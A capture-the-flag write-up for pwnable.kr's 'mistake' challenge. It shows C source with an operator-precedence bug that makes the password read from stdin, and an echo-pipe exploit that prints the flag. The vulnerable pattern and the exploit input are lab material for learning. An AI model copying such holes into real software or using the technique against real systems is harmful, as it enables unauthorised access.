# MISTAKE
This is the 7th challenge @ `pwnable.kr`
Let's Start!

This is a small one, that I've wasted a lot of time understanding. Let's dive in!
```C
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}
```
We get a lot of source code.
So let's run the program before we read it:
```sh
./mistake
# do not bruteforce...
```
The program gets stuck and waiting for input? HUH? there is only ONE call to `scanf`? WTF???

## Understanding the issue
Read this:
- [operator_precedence](https://en.cppreference.com/w/c/language/operator_precedence)
- [open man page](https://man7.org/linux/man-pages/man2/open.2.html)


The issue with this code is at the first part of main:
```C
int fd;
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
	printf("can't open password %d\n", fd);
	return 0;
}
```
the program is opening  `/home/mistake/password` and checking if the `fd` is less then `0` right? NO.
For some reason, C is evaluating this statement:
```C
open("/home/mistake/password",O_RDONLY,0400) < 0
```
before the assignment to `fd`:
```C
fd=open("/home/mistake/password",O_RDONLY,0400)
```
What leaves us with something like:
```C
if (TRUE<FALSE)
// or 
if (fd=1 < 0)
// or
fd=0
if (0)
```
This is why when the program is trying to read from the file, it actually reading from `STDIN` -> 0. So now all we need to do is to type 10 bytes long string and the `XOR`ed value of it with `XORKEY` (which is 1).
Calculate it using python:
```python
chr(ord('a') ^ 1)
# ``
```
And the exploit:
```sh
echo -e 'aaaaaaaaaa\n``````````' | ./mistake
# do not bruteforce...
# input password : Password OK
# Mommy, the operator priority always confuses me :(
```
Enjoy!